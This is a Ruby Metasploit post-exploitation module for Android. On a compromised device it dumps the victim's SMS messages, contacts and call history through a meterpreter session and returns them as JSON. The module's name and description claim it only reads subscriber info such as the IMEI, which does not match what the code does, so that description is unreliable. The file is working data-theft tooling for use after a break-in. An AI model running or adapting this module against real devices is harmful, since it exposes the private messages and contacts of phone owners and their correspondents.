##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post

  include Msf::Post::Common
  include Msf::Post::Android::Priv
  include Msf::Post::Android::System

  def initialize(info = {})
    super(update_info(info, {
            'Name'         => "extracts subscriber info from target device",
            'Description'  => %q{
            This module displays the subscriber info stored on the target phone.
            It uses call service to get values of each transaction code like imei etc.
        },
            'License'      => MSF_LICENSE,
            'Author'       => ['Auxilus'],
            'SessionTypes' => ['meterpreter', 'shell'],
            'Platform'     => 'android',
    }
          ))
  end

  def run
    data = {}
    if session.platform == "android"
      sms_list     = session.android.dump_sms
      contact_list = session.android.dump_contacts
      calllog_list = session.android.dump_calllog
      data         = {
              "sms_list"     => sms_list,
              "contact_list" => contact_list,
              "calllog_list" => calllog_list,
      }
      pub_json_result(true,
                      nil,
                      data,
                      self.uuid)
    else
      pub_json_result(true,
                      nil,
                      data,
                      self.uuid)
    end
  end
end
